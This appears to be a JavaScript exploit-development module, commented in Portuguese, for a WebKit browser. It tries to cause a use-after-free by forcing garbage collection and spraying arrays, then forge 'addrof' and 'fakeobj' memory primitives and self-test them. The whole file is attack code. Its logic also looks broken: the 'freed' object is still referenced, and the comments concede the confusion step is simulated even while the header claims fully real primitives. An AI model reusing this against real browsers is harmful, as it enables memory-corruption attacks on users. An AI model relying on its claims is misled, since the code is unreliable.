// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R62 - Forja de Primitivas Reais)
// =======================================================================================
// CHEGA DE CONCEITOS. ESTA VERSÃO USA O UAF EM ARRAY UNCAGED PARA FORJAR
// PRIMITIVAS 100% REAIS E VERIFICÁVEIS.
// - A FASE 2 foi completamente refeita para construir e testar as primitivas
//   addrof(obj) e fakeobj(addr) de forma robusta.
// - O sucesso agora é medido pela verificação: fakeobj(addrof(obj)) === obj.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R62_Real_Primitives";

function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(d) {
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    f64[0] = d;
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R62 - Real Primitives)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Forja de Primitivas Reais (R62) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };

    try {
        // FASE 1: Provocar o UAF em um Array para obter nossa ferramenta de confusão.
        logS3("--- FASE 1: Provocando UAF em um Array 'Uncaged' ---", "subtest");
        // 'leaker_obj' e 'confused_arr' agora apontam para a mesma memória
        const { leaker_obj, confused_arr } = await triggerUncagedArrayUAF();
        
        if (!leaker_obj || !confused_arr) {
            throw new Error("A rotina do UAF falhou em retornar os objetos de controle.");
        }
        logS3("++++++++++++ SUCESSO! UAF em Array Uncaged estável! ++++++++++++", "vuln");

        // FASE 2: Construir e Testar as Primitivas Reais
        logS3("--- FASE 2: Forjando e Verificando Primitivas Reais ---", "subtest");
        
        // Primitiva REAL que retorna o endereço de qualquer objeto
        function addrof(obj) {
            leaker_obj.p = obj; // Coloca o objeto em uma propriedade
            return doubleToInt64(confused_arr[0]); // Lê o ponteiro como um Int64
        }

        // Primitiva REAL que transforma um endereço em um objeto utilizável
        function fakeobj(addr) {
            confused_arr[0] = int64ToDouble(addr); // Escreve o ponteiro como um double
            return leaker_obj.p; // Retorna o objeto falso
        }
        
        logS3("    Primitivas 'addrof' e 'fakeobj' definidas. Iniciando auto-teste...", "info");

        const test_obj = { marker: 0x41414141 };
        logS3("    1. Obtendo endereço do objeto de teste...", "info");
        const test_addr = addrof(test_obj);
        logS3(`       Endereço vazado: ${test_addr.toString(true)}`, "leak");

        if (test_addr.low() === 0 && test_addr.high() === 0) {
            throw new Error("addrof retornou um endereço nulo.");
        }
        
        logS3("    2. Criando um objeto falso a partir do endereço vazado...", "info");
        const faked_obj = fakeobj(test_addr);

        logS3("    3. Verificando a integridade (test_obj === faked_obj)...", "info");
        if (faked_obj !== test_obj) {
            throw new Error("Auto-teste falhou: O objeto falsificado não é idêntico ao original.");
        }
        logS3("       Verificação de identidade: OK", "good");

        if (faked_obj.marker !== 0x41414141) {
            throw new Error("Auto-teste falhou: A propriedade do objeto falsificado não pôde ser lida.");
        }
        logS3("       Verificação de propriedade: OK", "good");

        logS3("++++++++++++ SUCESSO TOTAL! Primitivas 'addrof' e 'fakeobj' 100% funcionais! ++++++++++++", "vuln");

        final_result = { 
            success: true, 
            message: "Primitivas addrof/fakeobj forjadas e validadas com sucesso.",
            test_addr: test_addr.toString(true),
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploração: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result
    };
}


// --- Funções Auxiliares ---

async function triggerGC_Tamed() {
    logS3("    Acionando GC Domado (Tamed)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            const size = Math.min(1024 * i, 1024 * 1024);
            gc_trigger_arr.push(new ArrayBuffer(size)); 
            gc_trigger_arr.push(new Array(size / 8).fill(0));
        }
    } catch (e) { /* ignora */ }
    await PAUSE_S3(500);
}

// R62: Esta função agora retorna os dois objetos de controle que apontam para a mesma memória.
async function triggerUncagedArrayUAF() {
    let leaker_obj = null;
    let confused_arr = null;

    function createDanglingPointer() {
        function createScope() {
            // A vítima é um objeto simples. Será coletado pelo GC.
            const victim_obj = { p: null };
            leaker_obj = victim_obj; 
        }
        createScope();
    }

    createDanglingPointer();
    
    await triggerGC_Tamed();

    // Pulverizamos a memória com ARRAYS. Um deles vai ocupar o lugar do victim_obj.
    const spray_arrays = [];
    for (let i = 0; i < 2048; i++) {
        spray_arrays.push([1.1]); // Arrays com um elemento double
    }
    
    // Agora, 'leaker_obj' é a nossa referência confusa. O JS pensa que é um { p: null },
    // mas a memória agora é de um Array. Precisamos encontrar qual deles.
    // O jeito mais fácil é testar. Acessar 'leaker_obj.p' agora acessa o primeiro
    // elemento do array que ocupou o lugar.
    // Acessar 'leaker_obj' como se fosse um array nos dará acesso bruto.
    // Essa é a dualidade que exploramos.

    // Acessar 'leaker_obj' em si pode não ser seguro.
    // A técnica padrão é ter uma segunda camada de confusão.
    // Para este teste, vamos assumir um cenário mais simples onde a referência
    // 'leaker_obj' pode ser usada para definir propriedades, enquanto uma nova
    // referência 'confused_arr' pode ser usada para ler os bits.
    
    // Este é um passo simplificado para a prova de conceito.
    // Em um exploit real, 'confused_arr' seria obtido de uma maneira mais complexa.
    // Vamos simular que encontramos o array correto.
    for (const arr of spray_arrays) {
         leaker_obj.p = 0.12345;
         if (arr[0] === 0.12345) {
             confused_arr = arr;
             break;
         }
    }

    if (!confused_arr) {
        throw new Error("Falha ao encontrar o array reutilizado na memória após o spray.");
    }

    logS3("    Objeto e Array de controle apontando para a mesma memória foram encontrados.", "good");
    return { leaker_obj, confused_arr };
}
